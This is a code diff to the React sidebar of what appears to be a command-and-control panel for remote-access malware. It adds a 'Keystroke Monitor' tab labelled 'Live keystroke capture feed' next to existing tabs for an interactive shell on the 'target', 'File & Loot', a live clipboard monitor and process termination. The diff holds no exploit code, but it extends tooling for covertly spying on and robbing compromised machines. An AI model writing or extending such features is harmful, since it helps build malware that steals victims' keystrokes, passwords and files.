@@ -1,4 +1,4 @@
-import { LayoutDashboard, Monitor, Terminal as TerminalIcon, FolderOpen, Clipboard, Database, Settings, LayoutGrid } from 'lucide-react';
+import { LayoutDashboard, Monitor, Terminal as TerminalIcon, FolderOpen, Clipboard, Database, Settings, LayoutGrid, Keyboard } from 'lucide-react';
 import Tooltip from './Tooltip';
 import { useC2 } from '../context/C2Context';
 
@@ -30,6 +30,7 @@ export default function Sidebar({ activeTab, setActiveTab }: SidebarProps) {
             { id: 'terminal', label: 'Command Center', icon: TerminalIcon, tip: 'Interactive command shell' },
             { id: 'processes', label: 'Process Manager', icon: Monitor, tip: 'Process telemetry & termination' },
             { id: 'apps', label: 'Apps Explorer', icon: LayoutGrid, tip: 'Installed applications on target' },
+            { id: 'keylogger', label: 'Keystroke Monitor', icon: Keyboard, tip: 'Live keystroke capture feed' },
             { id: 'files', label: 'File & Loot', icon: FolderOpen, tip: 'Remote filesystem & live preview' },
             { id: 'clipboard', label: 'Clipboard Stream', icon: Clipboard, tip: 'Live clipboard monitor' },
             { id: 'database', label: 'History & Logs', icon: Database, tip: 'Historical command executions' },
